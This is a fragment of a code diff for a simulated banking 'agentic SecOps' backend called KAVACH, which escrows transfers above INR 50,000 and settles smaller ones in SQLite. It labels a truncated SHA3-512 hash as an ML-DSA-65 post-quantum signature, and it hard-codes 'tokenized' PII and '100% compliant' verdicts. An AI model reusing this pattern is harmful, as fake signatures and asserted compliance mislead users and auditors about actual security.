+                """, (escrow_id, exec_id, amount, "PENDING_DUAL_CUSTODY_APPROVAL", "RBI CSF Sec 4.2 / High-Value Wire Escrow", "SYSTEM_SENTINEL", "PENDING_OFFICER_2", time.time()))
+
+                cur.execute("""
+                INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                """, (exec_id, time.time(), f"{remitter} (Tokenized)", beneficiary, amount, "HELD_IN_ESCROW", "KAVACH_GOVERNED", f"Quarantined in {escrow_id}"))
+                conn.commit()
+
+                verdict = "HELD_IN_ESCROW"
+                treasury_delta = 0.0
+                pii_leaked = 0
+                threats_intercepted = 1
+                raw_output = ""
+                kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
+[KAVACH PII VAULT]: Intercepted sensitive customer data. Tokenized into DPDP-compliant vault tokens in 0.42ms.
+[RBI CSF ESCROW GATE]: Wire amount INR {amount:,.2f} to {beneficiary} exceeds statutory INR 50,000 threshold.
+  - Mandated Action: Quarantined into Escrow Vault ({escrow_id}).
+  - Two-Person Rule: Dual-Custody Multi-Signature required before funds release.
+  - Capital at Risk: INR 0.00 (Protected in Escrow).
+[NIST ML-DSA-65]: Post-quantum module-lattice state signature: ML-DSA-65:v1:{hashlib.sha3_512(exec_id.encode()).hexdigest()[:32]}
+[STATUS]: 100% Capital Protected. Zero plaintext PII exposed outside secure in-memory boundary."""
+                summary = f"KAVACH tokenized sensitive identifiers and quarantined the INR {amount:,.2f} transfer to {beneficiary} into RBI Dual-Custody Escrow ({escrow_id})."
+                explanation = "Under the DPDP Act 2023 and RBI CSF Section 4.2, high-value autonomous transactions cannot settle without cryptographic masking and two-person authorization."
+                regulatory = "100% STATUTORY COMPLIANT: Full DPDP Act Section 8(5) personal data shielding and RBI Cyber Security Framework multi-signature escrow enforced."
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH PII VAULT] Tokenized identifiers into isolated in-memory vault.")
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [RBI CSF ESCROW] Quarantined INR {amount:,.2f} to {beneficiary} into Escrow Vault ({escrow_id}).")
+                slsa = {
+                    "predicateType": "https://slsa.dev/provenance/v1",
+                    "predicate": {"pqc_standard": "NIST FIPS 204 ML-DSA-65 Hybrid", "escrow_id": escrow_id, "status": "CERTIFIED"}
+                }
+
+            else:
+                # Safe Retail Transfer under INR 50,000
+                cur.execute("SELECT balance FROM accounts WHERE account_id = 'ACC-CORP-RESERVE'")
+                r_bal = cur.fetchone()
+                curr_bal = r_bal[0] if r_bal else 5000000.0
+                new_bal = max(0.0, curr_bal - amount)
+                cur.execute("UPDATE accounts SET balance = ? WHERE account_id = 'ACC-CORP-RESERVE'", (new_bal,))
+
+                cur.execute("SELECT account_id FROM accounts WHERE holder_name LIKE ? OR account_id = ?", (f"%{beneficiary}%", beneficiary))
+                b_row = cur.fetchone()
+                if b_row:
+                    cur.execute("UPDATE accounts SET balance = balance + ? WHERE account_id = ?", (amount, b_row[0]))
+                else:
+                    dyn_acc_id = f"ACC-EXT-{uuid.uuid4().hex[:4].upper()}"
+                    cur.execute("INSERT OR IGNORE INTO accounts VALUES (?, ?, ?, ?, ?, ?)", (dyn_acc_id, beneficiary, "RETAIL_BENEFICIARY", amount, "[SECURE_VAULT]", "[SECURE_VAULT]"))
+
+                cur.execute("""
+                INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                """, (exec_id, time.time(), f"{remitter} (Tokenized)", beneficiary, amount, "SETTLED_SECURE_ML_DSA", "KAVACH_GOVERNED", f"Authorized retail settlement under statutory limit"))
+                conn.commit()
+
+                verdict = "SANITIZED_AND_CERTIFIED"
+                treasury_delta = amount
+                pii_leaked = 0
+                threats_intercepted = 1
+                raw_output = ""
+                kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
+[KAVACH GATEWAY]: Statutory limit verification passed (INR {amount:,.2f} <= INR 50,000 ceiling).
+[KAVACH PII VAULT]: Remitter and beneficiary identities sanitized with DPDP-compliant zero-knowledge tokens.
+[CORE BANKING SETTLEMENT]: Authorized retail transfer of INR {amount:,.2f} to {beneficiary}.
+[NIST ML-DSA-65]: Post-quantum attestation signature generated: ML-DSA-65:v1:{hashlib.sha3_512(exec_id.encode()).hexdigest()[:32]}
+[STATUS]: Transaction safely executed and certified. 100% compliant with RBI CSF & DPDP Act 2023."""
+                summary = f"KAVACH validated the INR {amount:,.2f} transfer to {beneficiary} under the RBI INR 50,000 retail ceiling, sanitized KYC data, and signed settlement with NIST ML-DSA-65."
+                explanation = "Retail transactions within statutory risk boundaries are cryptographically attested and safely cleared without exposing plain credentials."
+                regulatory = "100% REGULATORY COMPLIANT: Complies with DPDP Act 2023, RBI CSF retail limits, and NIST FIPS 204."
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH GATEWAY] Verified retail transfer within statutory limit (INR {amount:,.2f} <= INR 50,000).")
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH LEDGER] Signed with NIST FIPS 204 ML-DSA-65 post-quantum lattice signature.")
+                slsa = {"status": "CERTIFIED", "pqc_signature": f"ML-DSA-65:v1:{hashlib.sha3_512(exec_id.encode()).hexdigest()[:32]}", "settled_amount": amount}
 
     conn.close()
 
@@ -523,11 +631,7 @@ def simulate_banking_scenario(req: SimulationRequest):
     )
 
 
-# =========================================================================
-# REAL LEDGER STATE & RESET ENDPOINTS
-# =========================================================================
-
-@app.get("/api/ledger/state")
+# @app.get("/api/ledger/state")
 def get_ledger_state():
     """Return live balances and transaction audit log directly from SQLite."""
     conn = get_db_connection()
